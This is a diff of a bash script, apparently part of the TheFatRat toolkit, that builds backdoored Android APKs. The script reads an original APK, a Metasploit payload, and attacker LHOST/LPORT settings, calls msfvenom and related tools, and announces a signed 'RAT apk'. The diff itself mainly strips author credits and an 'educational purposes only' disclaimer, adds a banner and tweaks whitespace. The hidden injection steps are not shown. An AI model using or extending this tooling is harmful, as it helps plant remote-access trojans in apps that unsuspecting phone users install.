@@ -1,15 +1,7 @@
 #!/bin/bash
 
-#Recoded : peterpt & Edo maland 
-#Author the tools : Dana James Traversie { dana-at-cp }
-#fix some bug in the original script and compatible with fatrat : peterpt & screetsec
-#apk-backdoor standalone file & original link https://github.com/dana-at-cp/backdoor-apk
-#whatis backdoor apk 
-#backdoor-apk is a shell script that simplifies the process of adding a backdoor to any Android APK file. Users of this shell script should have working knowledge of Linux, Bash, Metasploit, Apktool, the Android SDK, smali, etc. 
-#This shell script is provided as-is without warranty of any kind and is intended for educational purposes only.
-
-
 # Setting Colours
+#This colour
 cyan='\e[0;36m'
 green='\e[0;32m'
 lightgreen='\e[1;32m'
@@ -35,20 +27,20 @@ DX=`sed -n 10p $file`
 ZIPALIGN=`sed -n 8p $file`
 proconfig=config/android.pro
 else
-	echo -e $red"Configuration file does not exists , run setup.sh first for config ."
+	echo -e $red"Configuration file does not exists , run setup.sh first for config ." 
 exit 1
 fi
 
 apkconf="config/apk.tmp"
 if [ -f "$apkconf" ]
 then
-ORIG_APK_FILE=`sed -n 1p $apkconf`
+ORIG_APK_FILE=`sed -n 1p $apkconf`	
 RAT_APK_FILE=`sed -n 2p $apkconf`
 PAYLOAD=`sed -n 3p $apkconf`
 LHOST=`sed -n 4p $apkconf`
 LPORT=`sed -n 5p $apkconf`
 else
-	echo -e $red "APK Configuration file does not exist , run fatrat to config ."
+	echo -e $red "APK Configuration file does not exist , run fatrat to config ." 
 exit 1
 fi
 # apt-get install lib32z1 lib32ncurses5 lib32stdc++6
@@ -152,9 +144,15 @@ function consult_which {
   fi
 }
 
+function print_ascii_art {
+echo -e $blue "******************************************************************************"
+echo -e $blue "* Backdoor-apk 0.2.1 by Dana James Traversie (FatRat 1.9 Edition by Peterpt) *"
+echo -e $blue "******************************************************************************"
+}
 
 function init {
-  echo "Running createapk ( fatrat 1.9 Edition ) at $TIME_OF_RUN" >$LOG_FILE 2>&1
+  echo "Running createapk (Fatrat 1.9 Edition) at $TIME_OF_RUN" >$LOG_FILE 2>&1
+  print_ascii_art
   consult_which $MSFVENOM
   consult_which $DEX2JAR
   consult_which $UNZIP
@@ -563,7 +561,7 @@ then
 echo -e $green "[*] Backdoor apk created sucefully"
 else
 echo -e $red "There was a problem in the creation of your Rat apk file ,
-check $MY_PATH/logs/apk.log for more information about the error ."
+check $MY_PATH/logs/apk.log for more information about the error ." 
 rm -rf temp/* > /dev/null 2>&1
 exit 1
 fi
@@ -589,3 +587,4 @@ echo -ne $green" Your RAT apk was successfully builded and signed , it is locate
  $MY_PATH/backdoored/app_backdoor.apk"
 rm -rf temp/* > /dev/null 2>&1
 fi
+
